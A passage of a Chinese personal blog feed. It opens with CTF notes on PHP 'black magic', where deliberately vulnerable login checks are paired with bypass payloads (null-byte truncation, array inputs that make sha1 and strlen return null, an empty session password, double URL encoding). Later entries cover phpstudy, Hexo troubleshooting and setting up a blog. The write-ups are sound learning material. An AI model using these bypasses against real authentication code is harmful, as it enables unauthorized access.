class="hljs-number">8</span> &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>] &gt; <span class="hljs-number">99999999</span>)<br>   &#123;<br>     <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-string">&#x27;*-*&#x27;</span>) !== <span class="hljs-literal">FALSE</span>) <span class="hljs-comment">//strpos — 查找字符串首次出现的位置</span><br>      &#123;<br>      <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span> . <span class="hljs-variable">$flag</span>);<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;&lt;p&gt;*-* have not been found&lt;/p&gt;&#x27;</span>); <br>       &#125;<br>      &#125;<br>     <span class="hljs-keyword">else</span> <br>     &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Invalid password&lt;/p&gt;&#x27;</span>; <br>      &#125;<br>   &#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h4><h5 id="001-00截断"><a href="#001-00截断" class="headerlink" title="001 %00截断"></a>001 %00截断</h5><p>需要满足条件<code>ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;])</code>不为false，即输入的值必须有大小写<strong>字母或者数字</strong>。</p><p>还需满足<code>strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 99999999</code>，即输入值<strong>长度小于8</strong>且<strong>大于99999999</strong>。</p><p>最后要满足<code>strpos ($_GET[&#39;password&#39;], &#39;*-*&#39;) !== FALSE</code>，也就是输入中必须有***-***。但是这条和第一条相悖，不慌，姐已经见过大世面了，姐可以绕过它。</p><blockquote><p>当ereg语句遇到%00的时候就会认为是休止符，不再往后看</p></blockquote><p>可以在字符串中添加%00，在它之后加*-*，骗一下第一个判断条件。</p><p>第二个条件可以使用科学计数法，比如1e10。</p><p><strong>最终playload</strong>：<code>?password=1e10%00*-*</code></p><p>本地复现没成功，我好得很哇我好的很哇😅</p><h4 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h4><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-02_20-17-52.png"></p><p>本地复现不成功是打不倒我的，我擅长使用百度。</p><p>翻译了一下是“调用了未定义函数”。在php5.3以上的版本将不再支持eregi()和ereg()函数，看了一下的我的版本号是7.3。</p><p>问题也不是不可避免，只需要改一下格式，把<code>ereg()</code>改成<code>erge_match()</code>就行。</p><p><del>但我不会改</del>😣</p><h4 id="002-数组绕过-1"><a href="#002-数组绕过-1" class="headerlink" title="002 数组绕过"></a>002 数组绕过</h4><p>冲浪冲到的另外一种方法</p><p>在true和false之外还有一个返回值是null。可以利用这一特点进行绕过。</p><p>ereg() 只能处理字符串，遇到数组会返回null，而且<code>null !== false</code>。同时，strlen()也不能处理数组，也会返回null，null的长度小于8。</p><p>因为要输入数组，数组大于整数，所以一定会返回true。</p><p><strong>最终playload</strong>：<code>?password=[]=1</code></p><h3 id="06-sha-函数比较绕过"><a href="#06-sha-函数比较绕过" class="headerlink" title="06 sha()函数比较绕过"></a>06 sha()函数比较绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#题目源代码</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;Modifer终将否极泰来&quot;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) <br>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>] == <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&#x27;</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))<br>      <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Invalid password.&lt;/p&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Login first!&lt;/p&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h4><p>要满足两个条件：<code>($_GET[&#39;name&#39;] ！== $_GET[&#39;password&#39;]</code>和</p><p><code>sha1($_GET[&#39;name&#39;]) === sha1($_GET[&#39;password&#39;])</code>。</p><p>就是要让输入的两个变量不相等但是sha1加密后相等。</p><p>不同的字符串经过sha1加密后一定不同，但是sha1不能加密数组，会报错返回null，如果让两个变量同时返回null就会相等辣。</p><p><strong>最终playload</strong>：<code>?name[]=1&amp;password[]=2</code></p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-02_20-57-05.png"></p><h3 id="07-session-验证绕过"><a href="#07-session-验证绕过" class="headerlink" title="07 session 验证绕过"></a>07 session 验证绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#题目源代码</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;Modifier终将否极泰来&quot;</span>;<br><br><span class="hljs-title function_ invoke__">session_start</span>(); <br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>] == <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;password&#x27;</span>])<br>        <span class="hljs-keyword">die</span> (<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;&lt;p&gt;Wrong guess.&lt;/p&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">mt_srand</span>((<span class="hljs-title function_ invoke__">microtime</span>() ^ <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10000</span>)) % <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10000</span>) + <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10000</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>要满足条件<code>$_GET[&#39;password&#39;] == $_SESSION[&#39;password&#39;]</code></p><blockquote><p>$_SESSION()存储会话信息</p></blockquote><p>这里session中的password需要我们自己传入，如果不传就是null，同时password也传空，二者就相等啦</p><p><strong>最终playload</strong>：<code>?password=</code></p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-02_21-40-38.png"></p><h3 id="08-urldecode-二次编码绕过"><a href="#08-urldecode-二次编码绕过" class="headerlink" title="08 urldecode 二次编码绕过"></a>08 urldecode 二次编码绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">#题目源代码</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">eregi</span>(<span class="hljs-string">&quot;hackerDJ&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);<br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>] == <span class="hljs-string">&quot;hackerDJ&quot;</span>)<br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;flag: *****************&#125; &lt;/p&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h5><p>需要满足两个条件：<code>eregi(&quot;hackerDJ&quot;,$_GET[&#39;id&#39;])</code>为false；经过urldecode编码后满足<code>$_GET[&#39;id&#39;] == &quot;hackerDJ&quot;</code></p><p>也就是说传入值不能是hackerDJ，但是传入值<strong>经过urldecode解码后</strong>要和hackerDJ相等。</p><p>所以传入时要将hackerDJ的url编码再编码一次。</p><p><strong>最终playload</strong>：<code>?id=%2568%2561%2563%256b%2544%254a</code></p><hr><p>总觉得少了点什么原来是把这个笔记忘记喽</p><p>发上来防止自己手贱删掉🦭</p><p>把万师傅的原博放这里</p><p><a href="https://drun1baby.github.io/2022/08/17/PHP-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">PHP 入门基础漏洞 | 芜风 (drun1baby.github.io)</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在浏览器打开本地PHP文件</title>
    <link href="/2023/02/28/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/"/>
    <url>/2023/02/28/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p>随机掉落废物Mod研究php的笔记😮</p><span id="more"></span><h2 id="01-配置PHP运行环境"><a href="#01-配置PHP运行环境" class="headerlink" title="01 配置PHP运行环境"></a>01 配置PHP运行环境</h2><p>万能的互联网教我下载Apache，PHP和MySQL。好多好麻烦。我选择直接用集成环境。</p><p><a href="https://www.xp.cn/">phpstudy官网</a></p><p>直接去官网下载，会有一个压缩包，解压以后打开第一个exe文件安装就好。</p><p><img src="/img/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/Snipaste_2023-02-28_20-04-46.png"></p><p>注意：压缩包保存的路径不能有中文和空格</p><p>在安装时的自定义选项中可以修改安装包的位置，我的是默认在D盘根目录，把它改到放压缩包的文件夹里了。</p><p><img src="/img/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/Snipaste_2023-02-28_20-06-25.png"></p><p>根据本人尝试，在浏览器看PHP文件只需要把Apache打开就行。</p><p><img src="/img/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/Snipaste_2023-02-28_20-32-00.png"></p><h2 id="02-把文件丢进网站根目录"><a href="#02-把文件丢进网站根目录" class="headerlink" title="02 把文件丢进网站根目录"></a>02 把文件丢进网站根目录</h2><p>在上述安装步骤步骤中，会生成<strong>phpstudy_pro</strong>文件夹，文件夹中又有<strong>WWW</strong>文件夹。</p><p>网站根目录就是www文件下，必须将文件放置此位置才算有效，否则无法运行php文件。</p><h2 id="03-运行PHP文件"><a href="#03-运行PHP文件" class="headerlink" title="03 运行PHP文件"></a>03 运行PHP文件</h2><p>打开浏览器，在导航栏输入<code>localhost/[文件名]</code>就可以啦</p><p><img src="/img/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/Snipaste_2023-02-28_20-42-05.png"></p><p><img src="/img/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/Snipaste_2023-02-28_20-41-36.png"></p><h2 id="04-土狗发言"><a href="#04-土狗发言" class="headerlink" title="04 土狗发言"></a>04 土狗发言</h2><p>因为有一个文件写错了，在浏览器打开的时候报错了。</p><p>它居然还可以报错！</p><p><img src="/img/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/Snipaste_2023-02-28_21-09-18.png"></p><p>太高级了</p><hr><p>集成环境yyds🥳</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>PHP</tag>
      
      <tag>phpstudy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo使用记录</title>
    <link href="/2023/02/23/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/"/>
    <url>/2023/02/23/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>遇到的一些奇怪问题和修改主题页面的经验✂️</p><span id="more"></span><h2 id="奇怪问题"><a href="#奇怪问题" class="headerlink" title="奇怪问题"></a>奇怪问题</h2><h4 id="插入图片坑"><a href="#插入图片坑" class="headerlink" title="插入图片坑"></a>插入图片坑</h4><p>在最开始写博客的时候，千挑万选找了张美图准备当封面，复制文件地址插入。<code>hexo g</code> <code>hexo s</code>本地预览一切正常，<code>hexo d</code>一条龙推上去发现图片被和谐掉了（<del>不是</del>）</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_20-13-07.png"></p><p>前去万能的互联网寻找了一下答案，有的说写文章的时候要建一个同名文件夹放图片，有的说要安装插件。</p><p>我当然是选择建文件夹这个更简单的操作。</p><p>在配置文件_config.yml里找到<strong>post_asset_folder</strong>，把false改为true，再次<code>hexo new</code>就建好.md文件和文件夹了。经过本人一顿Ctrl+C和Ctrl+V的操作把原文件和图片移到新的文件，充满信心地再次<code>hexo g</code> <code>hexo d</code></p><p>还是不显示图片</p><p>好的😢<del>一定是图片它真的违禁了</del></p><p>当我再次在互联网搜索时，我发现了一个华点</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_20-22-06.png"></p><p>这个markdown语法里的图片插入是<code>/</code>，但是我复制的图片路径用的是<code>\</code>！</p><p>我尝试着修改之后再次<code>hexo d</code></p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_20-30-47.png"></p><p>就这么成功了🤨</p><h4 id="Spawn-failed坑"><a href="#Spawn-failed坑" class="headerlink" title="Spawn failed坑"></a>Spawn failed坑</h4><p>美滋滋发了一篇笔记上来，发现格式有bug，抓紧时间修改。修改之后再次丝滑一条龙上传······</p><p>没丝滑成功</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_20-07-25.png"></p><p>报错喽🥳<del>我面容平和根本就没有在生气</del></p><p>翻译了一下是“请确保您有正确的访问权限”，不会搞。把目光投向万能的互联网，网上说是连接的问题。</p><p>看到一条说因为git 进行<code>push</code>或者<code>hexo d</code>的时候改变了一些.deploy_git文件下的内容，只需要重新down一下就行。</p><p>于是删除.deploy_git文件夹，再次<code>hexo c</code> <code>hexo g</code> <code>hexo d</code>。出现了一个新的.deploy_git文件！</p><p>依旧报错🥀</p><p>又继续冲浪找解决方案，又看到一条说要在_config.yml文件里把<strong>repo</strong>地址改成git地址。我早就改过了但是我发现这个人的<strong>deploy</strong>条目比我多一个<strong>branch</strong>。</p><p>秉承着不错过任何一个细节的态度我在自己的文件里也加上了这条并认真填入master。</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_21-11-55.png"></p><p>保存，<code>hexo d</code>，加载成功？？？</p><p>事情怎会如此简单，我解决完问题才想起要记录一下踩坑新鲜事，于是乎再次<code>hexo d</code>想看看效果。</p><p>又报错了😮我才十八眼神还挺好使的难道刚才是眼花了吗？</p><p>换了个搜索引擎继续搜，看到一个csdn上的讨论，都让修改repo地址。我不信邪继续往下拉，看到一条标签</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_21-17-43.png"></p><p>我脑海中的小灯泡突然就亮了，我回到浏览器看自己的博客，格式已经修改过来了，也就是说那次眼花是真的推上去了。</p><p>Github你不要太荒谬😅</p><h2 id="修改主题配置"><a href="#修改主题配置" class="headerlink" title="修改主题配置"></a>修改主题配置</h2><h4 id="页脚版权声明"><a href="#页脚版权声明" class="headerlink" title="页脚版权声明"></a>页脚版权声明</h4><p>原本的主题页脚，姐不喜欢，这个爱心太不符合姐Bking的人设了。</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_22-35-37.png"></p><p>我想要有个人版权声明的页脚，经过学习掌握版权声明格式后我开始准备大改特改。</p><p>凭借我只有一点知识的脑壳告诉我这种页面要用HTML来写。奈何肚子里墨水太少，只有图纸没有工具没法盖房子<del>（就是不会写代码）</del></p><p>算了，还是求助一下万能互联网吧</p><p>搜到的全是怎么给页脚添加运行时间🥲就是没人教你怎么写版权声明。换个思路，我去抓了一个别人网页的包直接偷现成的。</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_22-52-54.png"></p><p>代码get！</p><p>经过我一番努力，在主题的.yml文件里找到了<strong>footer</strong>部分，非常感谢主题作者的注释写得那么详细，很轻松就找到了HTML代码区。把原来的注释掉，再加上自己copy来的代码。</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_22-59-56.png"></p><p>一条龙以后美美得到自己喜欢的页脚🤪</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_22-58-07.png"></p>]]></content>
    
    
    <categories>
      
      <category>踩坑</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hexo</tag>
      
      <tag>无用但美丽的技巧</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一起来搭博客</title>
    <link href="/2023/01/07/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/"/>
    <url>/2023/01/07/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<p>利用hexo+GitHub搭建一个属于自己的博客</p><span id="more"></span><p>又名：我怎么什么都不会之踩坑记录🥀</p><p>建议在powershell执行命令，cmd有些步骤会提示权限不够</p><p>”踩坑“部分都是遇到的问题和吐槽的碎碎念，如果在过程中没有遇到问题就不用看🥰</p><h2 id="git下载"><a href="#git下载" class="headerlink" title="git下载"></a>git下载</h2><p>这里暂时先默认有git，因为当时搭博客的之前就有用到git了。</p><p>等我有空补上😇</p><h2 id="node-js下的Hexo安装和换源"><a href="#node-js下的Hexo安装和换源" class="headerlink" title="node.js下的Hexo安装和换源"></a>node.js下的Hexo安装和换源</h2><h4 id="node-js安装"><a href="#node-js安装" class="headerlink" title="node.js安装"></a>node.js安装</h4><p>首先需要给电脑安装一个node.js</p><p><a href="https://nodejs.org/en/download/">下载链接</a></p><p>我当时还没有记笔记的习惯所以node下载和配置这里没有笔记</p><p>可以看看菜鸟教程讲的很详细了</p><p><a href="https://www.runoob.com/nodejs/nodejs-install-setup.html">Node.js 安装配置 | 菜鸟教程 (runoob.com)</a></p><h4 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h4><p>给node.js换一个淘宝镜像，不然接下来下载hexo会timeout。</p><p>直接打开power shell输入以下命令：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">npm config <span class="hljs-built_in">set</span> registry https://registry.npm.taobao.org<br></code></pre></td></tr></table></figure><p>时间会比较长可以下楼跑个两公里</p><h4 id="Hexo安装"><a href="#Hexo安装" class="headerlink" title="Hexo安装"></a>Hexo安装</h4><p>powershell输入</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">npm install <span class="hljs-literal">-g</span> hexo<span class="hljs-literal">-cli</span><br></code></pre></td></tr></table></figure><p>换源以后下载速度贼快</p><h4 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h4><p>（接下来是不重要的碎碎念可以直接跳过看下一趴）</p><p>最开始看的教程说要修改环境变量，修改了大半天。执行npm install的时候一直报错，一气之下把node所有文件都删了，重新下载。</p><p><del>(别学我，遇到报错要找问题原因而不是逃避)</del></p><blockquote><p>大半夜下载不动寻求卷师傅帮忙，卷发现我的代理地址没更新，狠狠拖后腿。🥲</p></blockquote><p>重新下载之后保持自动配置的环境变量不变，在命令行里直接npm install发现还是报以前一样的错。</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_11-01-33.png"></p><p>复制百度发现是权限不够，要用管理员方式执行命令。</p><blockquote><p>所以我白删了呗！！</p></blockquote><p>win+R打开管理员方式终端，再次输入显示timeout。</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_10-59-37.png"></p><p>又百度发现需要换源。</p><p>直接从网上找了个现成的淘宝源，换好以后再install五秒成功。</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_11-02-39.png"></p><h2 id="Hexo的网页配置"><a href="#Hexo的网页配置" class="headerlink" title="Hexo的网页配置"></a>Hexo的网页配置</h2><p>下载后输入</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">hexo init blog<br></code></pre></td></tr></table></figure><p>这个命令就是在powershell当前的根目录下新建一个名为blog的文件夹，用于后续配置文件的存放。</p><p>[<em>blog</em>]好像可以填别的文件名，但我没试过所以不建议。</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_20-25-14.png"></p><p>建好文件夹之后初始化配置</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">cd <span class="hljs-keyword">blog </span>  <span class="hljs-comment">#进入blog文件夹</span><br>npm <span class="hljs-keyword">install </span>   <br></code></pre></td></tr></table></figure><p>这个命令结束以后就可以看到blog文件夹里有很多文件喽，类似于下图这样。</p><p>图片里有些文件你没有也没关系，因为这是我建成博客又下载了很多东西之后补截的图。😳</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2023-03-13_21-01-30.png"></p><p>两条命令生成网页</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo generate<br>hexo server<br></code></pre></td></tr></table></figure><p>当然喽hexo善解人意地支持简写，可以直接输入 <code>hexo g</code>和<code>hexo s</code></p><p>用浏览器预览网址<a href="http://localhost:4000/">http://localhost:4000</a></p><p>因为我们还没配置GitHub所以这个时候就是Hexo最基础的丑陋页面。</p><h4 id="踩坑-1"><a href="#踩坑-1" class="headerlink" title="踩坑"></a>踩坑</h4><p>cmd里输入hexo命令后又报错</p><p>说hexo不是可以执行的命令，百度后发现是环境变量的问题，<del>该死的环境变量</del></p><p>发现hexo-cli的bin目录下没有.cmd的文件，但是前一个目录里有，就直接复制过来，又把bin添加到了环境变量里，再hexo init</p><p>运行成功但报错，<del>想死</del></p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_12-29-06.png"></p><p>据说是因为目录下没有这个文件夹，<del>为什么应该有hexo的文件夹啊</del></p><p>换个思路，用管理员模式重新下载hexo（我就个遇到困难卸载删除的菜鸡😶‍🌫️</p><p>下载后运行<code>hexo init blog</code></p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_20-24-15.png"></p><p>又一次向万能的互联网求助，修改了一下power shell的权限，再运行</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_20-25-14.png"></p><p>成功（？？）</p><blockquote><p>管理员模式yyds</p></blockquote><h2 id="GitHub配置网页"><a href="#GitHub配置网页" class="headerlink" title="GitHub配置网页"></a>GitHub配置网页</h2><p>在GitHub里建一个<strong>用户名.github.io</strong>的仓库，建好以后点击page把这个库变成一个网页。</p><p>我们在命令行输入<code>hexo d</code> 时默认上传<strong>master</strong>分支，但是在GitHub页面默认<strong>main</strong>分支，需要改成master。没有下拉选项，要手动输入</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2023-03-13_21-16-37.png"></p><p>但是这个时候先别hexo d，会报错，因为还没连接GitHub和hexo。</p><p>这时候你在浏览器搜索<code>https://用户名.github.io</code>，出现仓库的自述文件就是成功啦。</p><h2 id="SSH连接GitHub"><a href="#SSH连接GitHub" class="headerlink" title="SSH连接GitHub"></a>SSH连接GitHub</h2><p>也是默认大家有这玩意的哈</p><p>在git里面输入</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">ssh<span class="hljs-literal">-keygen</span> <span class="hljs-literal">-t</span> rsa <span class="hljs-literal">-C</span> <span class="hljs-string">&quot;[your_email@example.com]&quot;</span><br></code></pre></td></tr></table></figure><p>按回车之后会提示输入内容，可以全部按回车，表示使用默认的<code>~/.ssh</code>文件目录存放密钥，以及不设置密钥的密码。</p><p>在文件夹里找到.ssh文件，找到里面的密钥复制到GitHub。在个人设置页面的SSH and GPG keys 添加</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2023-02-20_23-36-59.png"></p><p>再打开git输入连接命令</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_11-42-49.png"></p><h2 